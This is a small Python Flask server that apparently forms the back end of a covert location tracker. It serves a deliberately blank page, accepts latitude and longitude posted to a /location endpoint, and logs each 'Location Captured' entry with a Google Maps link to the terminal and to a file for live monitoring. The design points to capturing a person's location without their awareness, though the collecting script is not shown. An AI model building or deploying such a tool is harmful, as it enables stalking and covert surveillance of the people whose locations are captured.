from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    # Blank page, no visible UI
    return ''

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    maps_url = f"https://www.google.com/maps?q={lat},{lon}"

    # Print to terminal
    print(f"\n[{timestamp}] Location Captured:")
    print(f"Latitude: {lat}")
    print(f"Longitude: {lon}")
    print(f"Google Maps: {maps_url}")
    print("-" * 50)

    # Append to log file for bash tail
    with open("location.log", "a") as f:
        f.write(f"[{timestamp}] Latitude: {lat}, Longitude: {lon}\nGoogle Maps: {maps_url}\n\n")

    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
